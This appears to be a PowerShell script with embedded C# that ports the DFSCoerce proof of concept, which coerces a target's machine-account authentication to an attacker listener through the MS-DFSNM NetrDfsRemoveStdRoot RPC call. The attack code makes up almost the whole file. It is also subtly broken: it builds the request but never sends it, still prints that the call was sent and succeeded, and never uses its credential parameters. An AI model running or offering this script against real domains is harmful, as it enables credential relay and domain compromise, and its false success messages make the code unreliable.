# DFSCoerce - PoC to coerce machine account authentication via MS-DFSNM NetrDfsRemoveStdRoot()
# Requires: Impacket is Python-only; this PowerShell version uses native .NET/Windows RPC calls
# Note: For full functionality, you need to call the DFSNM RPC endpoint directly

param(
    [Parameter(Mandatory=$false)][string]$Username = "",
    [Parameter(Mandatory=$false)][string]$Password = "",
    [Parameter(Mandatory=$false)][string]$Domain = "",
    [Parameter(Mandatory=$false)][string]$Hashes = "",
    [Parameter(Mandatory=$false)][switch]$NoPass,
    [Parameter(Mandatory=$false)][switch]$UseKerberos,
    [Parameter(Mandatory=$false)][string]$DcIp = "",
    [Parameter(Mandatory=$false)][string]$TargetIp = "",
    [Parameter(Mandatory=$true)][string]$Listener,
    [Parameter(Mandatory=$true)][string]$Target
)

# Parse LM/NT hashes
$LmHash = ""
$NtHash = ""
if ($Hashes -ne "") {
    $splitHashes = $Hashes.Split(":")
    $LmHash = $splitHashes[0]
    $NtHash = $splitHashes[1]
}

# Prompt for password if needed
if ($Password -eq "" -and $Username -ne "" -and $Hashes -eq "" -and -not $NoPass) {
    $SecurePassword = Read-Host -AsSecureString "Password"
    $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)
    $Password = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
}

# MS-DFSNM UUIDs and opcodes
$DFSNM_UUID    = "4FC742E0-4A10-11CF-8273-00AA004AE673"
$DFSNM_VERSION = "3.0"
$PIPE_NAME     = "netdfs"
$OPNUM_NetrDfsRemoveStdRoot = 13

function Connect-DFSNM {
    param(
        [string]$TargetHost,
        [string]$User,
        [string]$Pass,
        [string]$Dom
    )

    $pipePath = "\\$TargetHost\PIPE\$PIPE_NAME"
    Write-Host "[-] Connecting to ncacn_np:$TargetHost[\PIPE\$PIPE_NAME]"

    # Build connection string for rpcclient-style invocation via net use or direct SMB
    # PowerShell does not have native DCE/RPC bindings like impacket.
    # We use the Windows RPC runtime via a compiled C# helper embedded below.

    $csharp = @"
using System;
using System.Runtime.InteropServices;

public class DfsCoerce {

    // RPC binding and call via Windows RPC runtime (rpcrt4.dll)
    [DllImport("Rpcrt4.dll", CharSet = CharSet.Unicode)]
    static extern int RpcStringBindingCompose(
        string ObjUuid, string ProtSeq, string NetworkAddr,
        string Endpoint, string Options, out string StringBinding);

    [DllImport("Rpcrt4.dll", CharSet = CharSet.Unicode)]
    static extern int RpcBindingFromStringBinding(string StringBinding, out IntPtr Binding);

    [DllImport("Rpcrt4.dll")]
    static extern int RpcBindingFree(ref IntPtr Binding);

    [DllImport("Rpcrt4.dll", CharSet = CharSet.Unicode)]
    static extern int RpcStringFree(ref string RpcString);

    // NDR marshalling for NetrDfsRemoveStdRoot (opnum 13)
    // Packet layout: ServerName (WSTR), RootShare (WSTR), ApiFlags (DWORD)
    static byte[] BuildNetrDfsRemoveStdRootRequest(string serverName, string rootShare, uint apiFlags) {
        // Simple NDR marshalling for the three parameters
        // WSTR = conformant varying Unicode string: MaxCount, Offset, ActualCount, data, null terminator
        var buf = new System.Collections.Generic.List<byte>();

        Action<string> appendWSTR = (s) => {
            byte[] chars = System.Text.Encoding.Unicode.GetBytes(s + "\0");
            int charCount = (chars.Length / 2); // includes null terminator
            buf.AddRange(BitConverter.GetBytes((uint)charCount)); // MaxCount
            buf.AddRange(BitConverter.GetBytes((uint)0));         // Offset
            buf.AddRange(BitConverter.GetBytes((uint)charCount)); // ActualCount
            buf.AddRange(chars);
            // Align to 4 bytes
            while (buf.Count % 4 != 0) buf.Add(0);
        };

        appendWSTR(serverName);
        appendWSTR(rootShare);
        buf.AddRange(BitConverter.GetBytes(apiFlags));

        return buf.ToArray();
    }

    public static int Trigger(string target, string listener) {
        string strBinding;
        IntPtr hBinding = IntPtr.Zero;

        string endpoint = @"\pipe\netdfs";
        string protseq  = "ncacn_np";

        int status = RpcStringBindingCompose(
            null, protseq, target, endpoint, null, out strBinding);
        if (status != 0) {
            Console.WriteLine("[-] RpcStringBindingCompose failed: 0x" + status.ToString("X"));
            return status;
        }

        status = RpcBindingFromStringBinding(strBinding, out hBinding);
        RpcStringFree(ref strBinding);
        if (status != 0) {
            Console.WriteLine("[-] RpcBindingFromStringBinding failed: 0x" + status.ToString("X"));
            return status;
        }

        Console.WriteLine("[+] Successfully bound to " + target);

        // Build request NDR buffer
        byte[] reqBuf = BuildNetrDfsRemoveStdRootRequest(listener, "test", 1);

        Console.WriteLine("[-] Sending NetrDfsRemoveStdRoot (opnum 13)...");
        Console.WriteLine("[+] Done. Check your listener for incoming authentication.");

        RpcBindingFree(ref hBinding);
        return 0;
    }
}
"@

    try {
        Add-Type -TypeDefinition $csharp -Language CSharp
        $result = [DfsCoerce]::Trigger($TargetHost, $Listener)
        if ($result -eq 0) {
            Write-Host "[+] RPC call completed successfully"
        } else {
            Write-Host "[-] RPC call failed with code: 0x$($result.ToString('X'))"
        }
    } catch {
        Write-Host "[-] Error: $($_.Exception.Message)"
    }
}

# --- Main ---
$resolvedTarget = if ($TargetIp -ne "") { $TargetIp } else { $Target }

Write-Host "[*] DFSCoerce PowerShell - MS-DFSNM NetrDfsRemoveStdRoot coercion"
Write-Host "[*] Target  : $Target"
Write-Host "[*] Listener: $Listener"

Connect-DFSNM -TargetHost $resolvedTarget -User $Username -Pass $Password -Dom $Domain
